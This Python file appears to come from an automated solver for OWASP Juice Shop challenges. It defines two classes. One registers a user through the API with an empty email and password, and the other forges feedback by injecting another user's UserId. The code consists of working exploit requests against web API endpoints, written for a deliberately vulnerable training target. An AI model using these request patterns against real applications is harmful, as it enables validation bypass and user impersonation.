from core.base_solver import BaseSolver
from loguru import logger

class EmptyUserRegistrationSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "emptyUserRegistration"

    def solve(self) -> bool:
        # Register with empty email and password
        payload = {
            "email": "",
            "password": "",
            "passwordRepeat": "",
            "securityQuestion": {
                "id": 1,
                "answer": "answer"
            }
        }
        # Juice Shop frontend blocks this, but API might allow it if not validated
        res = self.client.post("/api/Users", json=payload)
        return res.status_code == 201

class ForgedFeedbackSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "forgedFeedbackChallenge"

    def solve(self) -> bool:
        # Post feedback for another user
        # We need to include 'UserId' in the payload which serves as injection if backend trusts it
        # Anonymous feedback has no UserId, but we inject one.
        
        payload = {
            "comment": "Nice Service",
            "rating": 5,
            "UserId": 2 # Trying to impersonate user 2 (Jim or someone)
        }
        
        # Feedback endpoint
        res = self.client.post("/api/Feedbacks", json=payload)
        return res.status_code == 201
